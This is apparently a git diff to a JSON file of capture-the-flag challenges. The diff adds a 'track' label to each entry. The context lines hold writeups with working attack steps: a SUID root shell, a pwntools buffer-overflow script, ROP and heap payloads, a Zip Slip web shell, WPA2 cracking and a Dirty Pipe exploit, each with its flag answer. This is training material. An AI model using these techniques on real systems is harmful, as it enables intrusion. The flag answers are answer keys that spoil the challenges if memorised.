@@ -21,7 +21,8 @@
     "concept": "Open-Source Intelligence (OSINT) and visual information leakage",
     "cheatsheet": "gimp social_post.png (Levels & Curves adjustment)",
     "badge": "OSINT Investigator",
-    "writeup": "Sharpening the image reveals the terminal window showing the hostname."
+    "writeup": "Sharpening the image reveals the terminal window showing the hostname.",
+    "track": "war"
   },
   {
     "id": "misc-02",
@@ -45,7 +46,8 @@
     "concept": "QR code geometry and Reed-Solomon error correction",
     "cheatsheet": "zbarimg damaged_qr.png",
     "badge": "Code Reconstructor",
-    "writeup": "Reed-Solomon recovery algorithms allow direct decoding without manual repair."
+    "writeup": "Reed-Solomon recovery algorithms allow direct decoding without manual repair.",
+    "track": "war"
   },
   {
     "id": "misc-03",
@@ -69,7 +71,8 @@
     "concept": "Unicode Right-to-Left Override (RLO) file extension spoofing",
     "cheatsheet": "python3 -c \"print(repr(filename))\"",
     "badge": "Phishing Detector",
-    "writeup": "Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf."
+    "writeup": "Reversing the RLO trick reveals the true extension is .exe disguised visually as .pdf.",
+    "track": "war"
   },
   {
     "id": "misc-04",
@@ -93,7 +96,8 @@
     "concept": "Git forensics, dangling object recovery, and git reflog analysis",
     "cheatsheet": "git reflog ; git fsck --lost-found ; git show <dangling_hash>",
     "badge": "Git Archaeologist",
-    "writeup": "Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag."
+    "writeup": "Git fsck --lost-found locates the orphaned commit object containing the uncommitted flag.",
+    "track": "war"
   },
   {
     "id": "misc-05",
@@ -117,7 +121,8 @@
     "concept": "Multi-stage deobfuscation and CyberChef recipe chaining",
     "cheatsheet": "CyberChef: ROT13(13) -> From_Hex('Auto') -> Gunzip() -> From_Base64()",
     "badge": "Recipe Chef",
-    "writeup": "Chaining the 4 inverse operations in CyberChef unpacks the layered payload."
+    "writeup": "Chaining the 4 inverse operations in CyberChef unpacks the layered payload.",
+    "track": "war"
   },
   {
     "id": "misc-06",
@@ -141,7 +146,8 @@
     "concept": "DNS enumeration, TXT records, and OSINT domain reconnaissance",
     "cheatsheet": "dig +nocmd TXT target.gov.ph +noall +answer",
     "badge": "DNS Scout",
-    "writeup": "Querying TXT records exposes verification strings including the flag."
+    "writeup": "Querying TXT records exposes verification strings including the flag.",
+    "track": "war"
   },
   {
     "id": "misc-7",
@@ -165,7 +171,8 @@
     "concept": "Linux Privilege Escalation, SUID, GTFOBins, Capabilities",
     "cheatsheet": "checksec --file=./target",
     "badge": "Easy Misc/O",
-    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`"
+    "writeup": "1. Execute `find / -perm -4000 2>/dev/null`.\n2. Notice `/usr/bin/find` has SUID permission.\n3. Run GTFOBins exploit: `/usr/bin/find . -exec /bin/sh -p \\; -quit`.\n4. Shell prompt changes to `#` (root).\n5. Read `/root/flag.txt`.\n6. Flag: `flag{su1d_gtf0b1ns_r00t_pr1v3sc}`",
+    "track": "training"
   },
   {
     "id": "misc-8",
@@ -189,7 +196,8 @@
     "concept": "Buffer Overflow, Ret2Win, pwntools, x86-64 Stack Frame",
     "cheatsheet": "checksec --file=./target",
     "badge": "Medium Misc/O",
-    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`"
+    "writeup": "1. In GDB: `pattern create 64` and `pattern search` after segfault to determine offset is exactly 40 bytes.\n2. Obtain `win` function address in GDB: `print win` -> `0x401176`.\n3. In 64-bit systems, add a `ret` gadget for 16-byte stack alignment if crash occurs in `system` (MOVAPS issue).\n4. Exploit script:\n   ```python\n   from pwn import *\n   p = process('./vuln')\n   ret = 0x40101a\n   win = 0x401176\n   payload = b'A'*40 + p64(ret) + p64(win)\n   p.sendline(payload)\n   print(p.recvall())\n   ```\n5. Flag: `flag{r3t2w1n_st4ck_b0f_c0ntr0l}`",
+    "track": "training"
   },
   {
     "id": "misc-9",
@@ -213,7 +221,8 @@
     "concept": "ROP, Ret2Libc, GOT Overwrite, ASLR Bypass, pwntools",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`"
+    "writeup": "1. Find gadgets with ROPgadget: `ROPgadget --binary vuln | grep 'pop rdi'`.\n2. Stage 1 payload:\n   `payload1 = b'A'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)`.\n3. Parse leak and calculate libc base.\n4. Stage 2 payload:\n   `payload2 = b'A'*40 + p64(pop_rdi) + p64(bin_sh) + p64(system)`.\n5. Interactive shell opened; cat flag.\n6. Flag: `flag{r3t2l1bc_r0p_ch41n_nx_byp4ss}`",
+    "track": "training"
   },
   {
     "id": "misc-10",
@@ -237,7 +246,8 @@
     "concept": "Heap Exploitation, Tcache Poisoning, Safe Linking, glibc 2.35",
     "cheatsheet": "checksec --file=./target",
     "badge": "Hard Misc/O",
-    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`"
+    "writeup": "1. Free a chunk and leak the mangled pointer to compute heap base address: `heap_base = (leak << 12)`.\n2. Poison forward pointer with `target_addr ^ (chunk_addr >> 12)`.\n3. Allocate twice to get an arbitrary write primitive at target.\n4. Overwrite return address on stack with one_gadget.\n5. Flag: `flag{gl1bc_tc4ch3_p01s0n_s4f3_l1nk}`",
+    "track": "training"
   },
   {
     "id": "misc-11",
@@ -261,7 +271,8 @@
     "concept": "Zip Slip, Arbitrary File Overwrite, Archive Security, Path Traversal",
     "cheatsheet": "python3 -c \"import zipfile; # craft zip with ../../ path\"",
     "badge": "Archive Infiltrator",
-    "writeup": "1. Craft ZIP with filename `../../var/www/html/shell.php`.\n2. Submit ZIP to extraction endpoint.\n3. Access `shell.php` to execute commands and read flag.\n4. Flag: `flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}`"
+    "writeup": "1. Craft ZIP with filename `../../var/www/html/shell.php`.\n2. Submit ZIP to extraction endpoint.\n3. Access `shell.php` to execute commands and read flag.\n4. Flag: `flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}`",
+    "track": "training"
   },
   {
     "id": "misc-12",
@@ -285,7 +296,8 @@
     "concept": "Wireless Security, WPA2 PMKID, Hashcat 22000, hcxtools",
     "cheatsheet": "hashcat -m 22000 wifi.hc22000 /usr/share/wordlists/rockyou.txt",
     "badge": "Wi-Fi Cracker",
-    "writeup": "1. Extract PMKID using `hcxpcapngtool`.\n2. Run Hashcat mode 22000 against dictionary.\n3. Recovered password is the flag.\n4. Flag: `flag{wpa2_pmk1d_h4shc4t_cr4ck3d}`"
+    "writeup": "1. Extract PMKID using `hcxpcapngtool`.\n2. Run Hashcat mode 22000 against dictionary.\n3. Recovered password is the flag.\n4. Flag: `flag{wpa2_pmk1d_h4shc4t_cr4ck3d}`",
+    "track": "training"
   },
   {
     "id": "misc-13",
@@ -309,7 +321,8 @@
     "concept": "Aviation OSINT, ADS-B Transponders, FlightRadar24, ICAO Identifiers",
     "cheatsheet": "curl -s 'https://globe.adsbexchange.com/?icao=...'",
     "badge": "Sky Tracker",
-    "writeup": "1. Look up ICAO hex address in ADS-B Exchange historical database.\n2. Trace radar breadcrumb logs to destination airport (Zamboanga International Airport / RPMZ).\n3. Flag: `flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}`"
+    "writeup": "1. Look up ICAO hex address in ADS-B Exchange historical database.\n2. Trace radar breadcrumb logs to destination airport (Zamboanga International Airport / RPMZ).\n3. Flag: `flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}`",
+    "track": "training"
   },
   {
     "id": "misc-14",
@@ -333,7 +346,8 @@
     "concept": "Shadow Analysis, Suncalc, Ephemeris Geolocation, Chronolocation",
     "cheatsheet": "python3 -c \"import suncalc; # calculate solar azimuth & altitude\"",
     "badge": "Solar Cartographer",
-    "writeup": "1. Compute solar elevation angle: $\\arctan(1 / 1.42) = 35.1^\\circ$.\n2. In Suncalc: find time when sun was at $35.1^\\circ$ altitude and opposite bearing (228 degrees azimuth).\n3. Reconstructed timestamp matches target flag format.\n4. Flag: `flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}`"
+    "writeup": "1. Compute solar elevation angle: $\\arctan(1 / 1.42) = 35.1^\\circ$.\n2. In Suncalc: find time when sun was at $35.1^\\circ$ altitude and opposite bearing (228 degrees azimuth).\n3. Reconstructed timestamp matches target flag format.\n4. Flag: `flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}`",
+    "track": "training"
   },
   {
     "id": "misc-15",
@@ -357,7 +371,8 @@
     "concept": "Format String Exploitation, Arbitrary Memory Write (%n), GOT Overwriting, pwntools",
     "cheatsheet": "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x401150}))\"",
     "badge": "Format Smasher",
-    "writeup": "1. Determine argument stack offset using `%p.%p.%p...`.\n2. Write exploit using pwntools `fmtstr_payload` targeting `puts@GOT`.\n3. Send payload; next call to `puts` spawns interactive shell.\n4. Flag: `flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}`"
+    "writeup": "1. Determine argument stack offset using `%p.%p.%p...`.\n2. Write exploit using pwntools `fmtstr_payload` targeting `puts@GOT`.\n3. Send payload; next call to `puts` spawns interactive shell.\n4. Flag: `flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}`",
+    "track": "training"
   },
   {
     "id": "misc-16",
@@ -381,6 +396,7 @@
     "concept": "Kernel Exploitation, CVE-2022-0847, Dirty Pipe, Page Cache Corruption",
     "cheatsheet": "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 1 root::0:0...",
     "badge": "Kernel Overlord",
-    "writeup": "1. Compile Dirty Pipe C exploit.\n2. Execute exploit targeting `/etc/passwd` to remove root password prompt.\n3. Spawn root shell with `su -`.\n4. Read `/root/flag.txt`.\n5. Flag: `flag{d1rty_p1p3_cv3_2022_0847_r00t}`"
+    "writeup": "1. Compile Dirty Pipe C exploit.\n2. Execute exploit targeting `/etc/passwd` to remove root password prompt.\n3. Spawn root shell with `su -`.\n4. Read `/root/flag.txt`.\n5. Flag: `flag{d1rty_p1p3_cv3_2022_0847_r00t}`",
+    "track": "training"
   }
 ]
